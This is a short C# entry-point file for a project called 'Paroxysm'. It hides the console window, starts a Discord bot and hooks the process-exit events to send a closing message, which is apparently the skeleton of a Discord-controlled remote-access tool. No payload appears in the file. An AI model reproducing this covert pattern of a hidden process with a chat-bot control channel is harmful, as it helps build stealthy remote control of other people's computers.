using Paroxysm.API;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;
using System.Diagnostics;

namespace Paroxysm;

internal abstract class Program
{
    public static void Main(string[] args)
    {
        // Hide console
        ConsoleAction.Follow();

        // Initialize discord bot
        DiscordAPI.Init().GetAwaiter().GetResult();

        // Before Close Event
        Console.CancelKeyPress += MonitorProcess.OnBeforeClose;
        Process.GetCurrentProcess().Exited += MonitorProcess.SendClosingMessage;   
    }
}